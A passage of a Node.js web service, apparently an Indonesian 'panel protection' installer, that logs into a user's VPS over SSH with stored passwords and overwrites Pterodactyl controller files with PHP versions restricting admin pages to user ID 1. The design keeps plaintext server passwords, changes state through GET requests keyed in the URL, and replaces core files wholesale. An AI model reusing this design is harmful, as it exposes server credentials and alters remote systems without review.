     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function update(UserFormRequest $request, User $user): RedirectResponse
    {
        $restrictedFields = ['email', 'first_name', 'last_name', 'password'];

        foreach ($restrictedFields as $field) {
            if ($request->filled($field) && $request->user()->id !== 1) {
                throw new DisplayException("⚠️ Data hanya bisa diubah oleh admin ID 1. ©Protect By @SuikaOfficial");
            }
        }

        if ($user->root_admin && $request->user()->id !== 1) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat menurunkan hak admin user ini! ©Protect By @SuikaOfficial.");
        }

        if ($request->user()->id !== 1 && $request->user()->id !== $user->id) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat mengubah data user lain! ©Protect By @SuikaOfficial.");
        }

        // Hapus root_admin dari request agar user biasa tidak bisa ubah level
        $data = $request->normalize();
        if ($request->user()->id !== 1) {
            unset($data['root_admin']);
        }

        $this->updateService
            ->setUserLevel(User::USER_LEVEL_ADMIN)
            ->handle($user, $data);

        $this->alert->success(trans('admin/user.notices.account_updated'))->flash();

        return redirect()->route('admin.users.view', $user->id);
    }

    /**
     * Get a JSON response of users on the system.
     */
    public function json(Request $request): Model|Collection
    {
        $authUser = $request->user();
        $query = QueryBuilder::for(User::query())->allowedFilters(['email']);

        if ($authUser->id !== 1) {
            $query->where('id', $authUser->id);
        }

        $users = $query->paginate(25);

        if ($request->query('user_id')) {
            $user = User::query()->findOrFail($request->input('user_id'));
            if ($authUser->id !== 1 && $authUser->id !== $user->id) {
                throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat melihat data user lain! ©Protect By @SuikaOfficial.");
            }
            $user->md5 = md5(strtolower($user->email));
            return $user;
        }

        return $users->map(function ($item) {
            $item->md5 = md5(strtolower($item->email));
            return $item;
        });
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_UserController.php');
        fs.writeFileSync(tempFile, userControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/UserController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        logSuccess(`Protect2 installed by ${userId} on ${session.host}`);
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT2',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/UserController.php',
            message: '✅ Proteksi 2 berhasil dipasang! Anti Intip Users & Anti CADMIN aktif.'
        });
        
    } catch (err) {
        logError('Install protect2 error:', err);
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT3 =========================
app.get('/api/installprotect3', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const locationControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Location;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\LocationFormRequest;
use Pterodactyl\\Services\\Locations\\LocationUpdateService;
use Pterodactyl\\Services\\Locations\\LocationCreationService;
use Pterodactyl\\Services\\Locations\\LocationDeletionService;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;

class LocationController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected LocationCreationService $creationService,
        protected LocationDeletionService $deletionService,
        protected LocationRepositoryInterface $repository,
        protected LocationUpdateService $updateService,
        protected ViewFactory $view
    ) {
    }

    public function index(): View
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @SuikaOfficial.');
        }

        return $this->view->make('admin.locations.index', [
            'locations' => $this->repository->getAllWithDetails(),
        ]);
    }

    public function view(int $id): View
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @SuikaOfficial.');
        }

        return $this->view->make('admin.locations.view', [
            'location' => $this->repository->getWithNodes($id),
        ]);
    }

    public function create(LocationFormRequest $request): RedirectResponse
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @SuikaOfficial.');
        }

        $location = $this->creationService->handle($request->normalize());
        $this->alert->success('Location was created successfully.')->flash();

        return redirect()->route('admin.locations.view', $location->id);
    }

    public function update(LocationFormRequest $request, Location $location): RedirectResponse
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @SuikaOfficial.');
        }

        if ($request->input('action') === 'delete') {
            return $this->delete($location);
        }

        $this->updateService->handle($location->id, $request->normalize());
        $this->alert->success('Location was updated successfully.')->flash();

        return redirect()->route('admin.locations.view', $location->id);
    }

    public function delete(Location $location): RedirectResponse
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @SuikaOfficial.');
        }

        try {
            $this->deletionService->handle($location->id);
            return redirect()->route('admin.locations');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }

        return redirect()->route('admin.locations.view', $location->id);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_LocationController.php');
        fs.writeFileSync(tempFile, locationControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/LocationController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT3',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/LocationController.php',
            message: '✅ Proteksi 3 berhasil dipasang! Anti Intip Location aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT4 =========================
app.get('/api/installprotect4', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const nodeControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Nodes;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Illuminate\\Contracts\\View\\Factory as ViewFactory;
use Pterodactyl\\Models\\Node;
use Spatie\\QueryBuilder\\QueryBuilder;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\NodeFormRequest;
use Pterodactyl\\Services\\Nodes\\NodeUpdateService;
use Pterodactyl\\Services\\Nodes\\NodeCreationService;
use Pterodactyl\\Services\\Nodes\\NodeDeletionService;
use Pterodactyl\\Contracts\\Repository\\NodeRepositoryInterface;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Exceptions\\DisplayException;

class NodeController extends Controller
{
    public function __construct(
        protected ViewFactory $view,
        protected NodeRepositoryInterface $repository,
        protected NodeCreationService $creationService,
        protected NodeUpdateService $updateService,
        protected NodeDeletionService $deletionService,
        protected AlertsMessageBag $alert
    ) {
    }

    private function checkAdminAccess(): void
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak! Hanya Admin utama (ID 1) yang dapat mengakses menu Nodes. 
©Protect By @SuikaOfficial');
        }
    }

    public function index(Request $request): View
    {
        $this->checkAdminAccess();

        $nodes = QueryBuilder::for(
            Node::query()->with('location')->withCount('servers')
        )
            ->allowedFilters(['uuid', 'name'])
            ->allowedSorts(['id'])
            ->paginate(25);

        return $this->view->make('admin.nodes.index', ['nodes' => $nodes]);
    }

    public function create(): View
    {
        $this->checkAdminAccess();
        return $this->view->make('admin.nodes.new');
    }

    public function store(NodeFormRequest $request): RedirectResponse
    {
        $this->checkAdminAccess();

        $node = $this->creationService->handle($request->normalize());
        $this->alert->success('✅ Node berhasil dibuat.')->flash();

        return redirect()->route('admin.nodes.view', $node->id);
    }

    public function view(int $id): View
    {
        $this->checkAdminAccess();

        $node = $this->repository->getByIdWithAllocations($id);
        return $this->view->make('admin.nodes.view', ['node' => $node]);
    }

    public function edit(int $id): View
    {
        $this->checkAdminAccess();

        $node = $this->repository->getById($id);
        return $this->view->make('admin.nodes.edit', ['node' => $node]);
    }

    public function update(NodeFormRequest $request, int $id): RedirectResponse
    {
        $this->checkAdminAccess();

        $this->updateService->handle($id, $request->normalize());
        $this->alert->success('✅ Node berhasil diperbarui.')->flash();

        return redirect()->route('admin.nodes.view', $id);
    }

    public function delete(int $id): RedirectResponse
    {
        $this->checkAdminAccess();

        try {
            $this->deletionService->handle($id);
            $this->alert->success('🗑️ Node berhasil dihapus.')->flash();
            return redirect()->route('admin.nodes');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }

        return redirect()->route('admin.nodes.view', $id);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_NodeController.php');
        fs.writeFileSync(tempFile, nodeControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/Nodes/NodeController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT4',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/Nodes/NodeController.php',
            message: '✅ Proteksi 4 berhasil dipasang! Anti Intip Nodes aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT5 =========================
app.get('/api/installprotect5', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const nestControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Nests;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Nests\\NestUpdateService;
use Pterodactyl\\Services\\Nests\\NestCreationService;
use Pterodactyl\\Services\\Nests\\NestDeletionService;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Nest\\StoreNestFormRequest;
use Pterodactyl\\Exceptions\\DisplayException;

class NestController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected NestCreationService $nestCreationService,
        protected NestDeletionService $nestDeletionService,
        protected NestRepositoryInterface $repository,
        protected NestUpdateService $nestUpdateService,
        protected ViewFactory $view
    ) {
    }

    /**
     * 🔒 Cek akses: hanya admin ID 1 yang boleh lanjut.
     */
    private function checkAdminAccess(): void
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak! Hanya Admin utama (ID 1) yang dapat membuka menu Nests. 
©Protect By @SuikaOfficial');
        }
    }

    public function index(): View
    {
        $this->checkAdminAccess();

        return $this->view->make('admin.nests.index', [
            'nests' => $this->repository->getWithCounts(),
        ]);
    }

    public function create(): View
    {
        $this->checkAdminAccess();
        return $this->view->make('admin.nests.new');
    }

    public function store(StoreNestFormRequest $request): RedirectResponse
    {
        $this->checkAdminAccess();
        $nest = $this->nestCreationService->handle($request->normalize());
        $this->alert->success('✅ Nest berhasil dibuat.')->flash();
        return redirect()->route('admin.nests.view', $nest->id);
    }

    public function view(int $nest): View
    {
        $this->checkAdminAccess();
        return $this->view->make('admin.nests.view', [
            'nest' => $this->repository->getWithEggServers($nest),
        ]);
    }

    public function update(StoreNestFormRequest $request, int $nest): RedirectResponse
    {
        $this->checkAdminAccess();
        $this->nestUpdateService->handle($nest, $request->normalize());
        $this->alert->success('✅ Nest berhasil diperbarui.')->flash();
        return redirect()->route('admin.nests.view', $nest);
    }

    public function destroy(int $nest): RedirectResponse
    {
        $this->checkAdminAccess();
        try {
            $this->nestDeletionService->handle($nest);
            $this->alert->success('🗑️ Nest berhasil dihapus.')->flash();
            return redirect()->route('admin.nests');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }
        return redirect()->route('admin.nests.view', $nest);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_NestController.php');
        fs.writeFileSync(tempFile, nestControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/Nests/NestController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT5',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/Nests/NestController.php',
            message: '✅ Proteksi 5 berhasil dipasang! Anti Intip Nest aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT6 =========================
app.get('/api/installprotect6', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const settingsCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Settings;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\Contracts\\Console\\Kernel;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Traits\\Helpers\\AvailableLanguages;
use Pterodactyl\\Services\\Helpers\\SoftwareVersionService;
use Pterodactyl\\Contracts\\Repository\\SettingsRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Settings\\BaseSettingsFormRequest;

class IndexController extends Controller
{
    use AvailableLanguages;

    public function __construct(
        private AlertsMessageBag $alert,
        private Kernel $kernel,
        private SettingsRepositoryInterface $settings,
        private SoftwareVersionService $versionService,
        private ViewFactory $view
    ) {
    }

    public function index(): View
    {
        // 🔒 Anti akses menu Settings selain user ID 1
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat membuka menu Settings! ©Protect By @SuikaOfficial.');
        }

        return $this->view->make('admin.settings.index', [
            'version' => $this->versionService,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    public function update(BaseSettingsFormRequest $request): RedirectResponse
    {
        // 🔒 Anti akses update settings selain user ID 1
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat update menu Settings! ©Protect By @SuikaOfficial.');
        }

        foreach ($request->normalize() as $key => $value) {
            $this->settings->set('settings::' . $key, $value);
        }

        $this->kernel->call('queue:restart');
        $this->alert->success(
            'Panel settings have been updated successfully and the queue worker was restarted to apply these changes.'
        )->flash();

        return redirect()->route('admin.settings');
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_SettingsController.php');
        fs.writeFileSync(tempFile, settingsCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/Settings/IndexController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT6',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/Settings/IndexController.php',
            message: '✅ Proteksi 6 berhasil dipasang! Anti Intip Settings aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT7 =========================
app.get('/api/installprotect7', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const fileControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Carbon\\CarbonImmutable;
use Illuminate\\Http\\Response;
use Illuminate\\Http\\JsonResponse;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Services\\Nodes\\NodeJWTService;
use Pterodactyl\\Repositories\\Wings\\DaemonFileRepository;
use Pterodactyl\\Transformers\\Api\\Client\\FileObjectTransformer;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\{
    CopyFileRequest, PullFileRequest, ListFilesRequest, ChmodFilesRequest,
    DeleteFileRequest, RenameFileRequest, CreateFolderRequest,
    CompressFilesRequest, DecompressFilesRequest, GetFileContentsRequest, WriteFileContentRequest
};

class FileController extends ClientApiController
{
    public function __construct(
        private NodeJWTService $jwtService,
        private DaemonFileRepository $fileRepository
    ) {
        parent::__construct();
    }

    /**
     * 🔒 NDy DoubleProtect v3.3 — Cegah akses file server orang.
     */
    private function checkServerAccess($request, Server $server)
    {
        $authUser = Auth::user();

        if (!$authUser) {
            abort(403, '🚫 Tidak dapat memverifikasi pengguna. Silakan login ulang. ©NDyProtect');
        }

        if ($authUser->id === 1) {
            return;
        }

        if ($authUser->id !== $server->owner_id) {
            abort(403, "🚫 Kasihan gabisa yaaa? 😹 Ini bukan servermu! Akses ditolak total. ©Protect By @SuikaOfficial");
        }
    }

    public function directory(ListFilesRequest $request, Server $server): array
    {
        $this->checkServerAccess($request, $server);

        $contents = $this->fileRepository
            ->setServer($server)
            ->getDirectory($request->get('directory') ?? '/');

        return $this->fractal->collection($contents)
            ->transformWith($this->getTransformer(FileObjectTransformer::class))
            ->toArray();
    }

    public function contents(GetFileContentsRequest $request, Server $server): Response
    {
        $this->checkServerAccess($request, $server);

        $response = $this->fileRepository->setServer($server)->getContent(
            $request->get('file'),
            config('pterodactyl.files.max_edit_size')
        );

        Activity::event('server:file.read')->property('file', $request->get('file'))->log();

        return new Response($response, Response::HTTP_OK, ['Content-Type' => 'text/plain']);
    }

    public function download(GetFileContentsRequest $request, Server $server): array
    {
        $this->checkServerAccess($request, $server);

        $token = $this->jwtService
            ->setExpiresAt(CarbonImmutable::now()->addMinutes(15))
            ->setUser($request->user())
            ->setClaims([
                'file_path' => rawurldecode($request->get('file')),
                'server_uuid' => $server->uuid,
            ])
            ->handle($server->node, $request->user()->id . $server->uuid);

        Activity::event('server:file.download')->property('file', $request->get('file'))->log();

        return [
            'object' => 'signed_url',
            'attributes' => [
                'url' => sprintf('%s/download/file?token=%s', $server->node->getConnectionAddress(), $token->toString()),
            ],
        ];
    }

    public function write(WriteFileContentRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->putContent($request->get('file'), $request->getContent());
        Activity::event('server:file.write')->property('file', $request->get('file'))->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function create(CreateFolderRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->createDirectory($request->input('name'), $request->input('root', '/'));

        Activity::event('server:file.create-directory')
            ->property('name', $request->input('name'))
            ->property('directory', $request->input('root'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function rename(RenameFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->renameFiles($request->input('root'), $request->input('files'));

        Activity::event('server:file.rename')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function copy(CopyFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->copyFile($request->input('location'));
        Activity::event('server:file.copy')->property('file', $request->input('location'))->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function compress(CompressFilesRequest $request, Server $server): array
    {
        $this->checkServerAccess($request, $server);

        $file = $this->fileRepository->setServer($server)->compressFiles(
            $request->input('root'),
            $request->input('files')
        );

        Activity::event('server:file.compress')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return $this->fractal->item($file)
            ->transformWith($this->getTransformer(FileObjectTransformer::class))
            ->toArray();
    }

    public function decompress(DecompressFilesRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        set_time_limit(300);

        $this->fileRepository->setServer($server)->decompressFile(
            $request->input('root'),
            $request->input('file')
        );

        Activity::event('server:file.decompress')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('file'))
            ->log();

        return new JsonResponse([], JsonResponse::HTTP_NO_CONTENT);
    }

    public function delete(DeleteFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->deleteFiles(
            $request->input('root'),
            $request->input('files')
        );

        Activity::event('server:file.delete')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function chmod(ChmodFilesRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->chmodFiles(
            $request->input('root'),
            $request->input('files')
        );

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function pull(PullFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->pull(
            $request->input('url'),
            $request->input('directory'),
            $request->safe(['filename', 'use_header', 'foreground'])
        );

        Activity::event('server:file.pull')
            ->property('directory', $request->input('directory'))
            ->property('url', $request->input('url'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_FileController.php');
        fs.writeFileSync(tempFile, fileControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/FileController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT7',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/FileController.php',
            message: '✅ Proteksi 7 berhasil dipasang! Anti Akses File & Download aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT8 =========================
app.get('/api/installprotect8', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const apiServerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Transformers\\Api\\Client\\ServerTransformer;
use Pterodactyl\\Services\\Servers\\GetUserPermissionsService;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\GetServerRequest;

class ServerController extends ClientApiController
{
    public function __construct(private GetUserPermissionsService $permissionsService)
    {
        parent::__construct();
    }

    /**
     * 🧱 NDy Anti-Intip Server Protect v2.5
     * Hanya Admin utama (ID 1) atau pemilik server yang dapat melihat detail server.
     */
    public function index(GetServerRequest $request, Server $server): array
    {
        $authUser = Auth::user();

        if (!$authUser) {
            abort(403, '🚫 Tidak dapat memverifikasi pengguna. Silakan login ulang.');
        }

        if ($authUser->id !== 1 && (int) $server->owner_id !== (int) $authUser->id) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) atau pemilik server yang dapat melihat server ini! ©Protect By @SuikaOfficial');
        }

        return $this->fractal->item($server)
            ->transformWith($this->getTransformer(ServerTransformer::class))
            ->addMeta([
                'is_server_owner' => $authUser->id === $server->owner_id,
                'user_permissions' => $this->permissionsService->handle($server, $authUser),
            ])
            ->toArray();
    }
}`;
        
        const tempFile = path.join(__dirname, 'temp_ApiServerController.php');
        fs.writeFileSync(tempFile, apiServerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT8',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php',
            message: '✅ Proteksi 8 berhasil dipasang! Anti Intip Server API aktif.'
        });
        
    } catch (err) {
        res.json({ valid: true, success: false, message: `❌ Gagal: ${err.message}` });
    }
});

// ========================= 🛡️ INSTALL PROTECT9 =========================
app.get('/api/installprotect9', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const apiKeyCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\ApiKey;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Services\\Acl\\Api\\AdminAcl;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Api\\KeyCreationService;
use Pterodactyl\\Contracts\\Repository\\ApiKeyRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Api\\StoreApplicationApiKeyRequest;

class ApiController extends Controller
{
    public function __construct(
        private AlertsMessageBag $alert,
        private ApiKeyRepositoryInterface $repository,
        private KeyCreationService $keyCreationService,
        private ViewFactory $view,
    ) {}

    /**
     * 🧱 NDy DoubleProtect v2.3 — Anti Intip APIKEY
     * Hanya Admin utama (ID 1) yang dapat mengakses menu APIKEY.
     */
    private function protectAccess()
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat mengakses halaman APIKEY! ©Protect By @SuikaOfficial');
        }
    }

    public function index(Request $request): View
    {
        $this->protectAccess();

        return $this->view->make('admin.api.index', [
            'keys' => $this->repository->getApplicationKeys($request->user()),
        ]);
    }

    public function create(): View
    {
        $this->protectAccess();

        $resources = AdminAcl::getResourceList();
        sort($resources);

        return $this->view->make('admin.api.new', [
            'resources' => $resources,
            'permissions' => [
                'r' => AdminAcl::READ,
                'rw' => AdminAcl::READ | AdminAcl::WRITE,
                'n' => AdminAcl::NONE,
            ],
        ]);
    }

    public function store(StoreApplicationApiKeyRequest $request): RedirectResponse
    {
        $this->protectAccess();

        $this->keyCreationService->setKeyType(ApiKey::TYPE_APPLICATION)->handle([
            'memo' => $request->input('memo'),
            'user_id' => $request->user()->id,
        ], $request->getKeyPermissions());

        $this->alert->success('✅ API Key baru berhasil dibuat untuk Admin utama.')->flash();
        return redirect()->route('admin.api.index');
    }

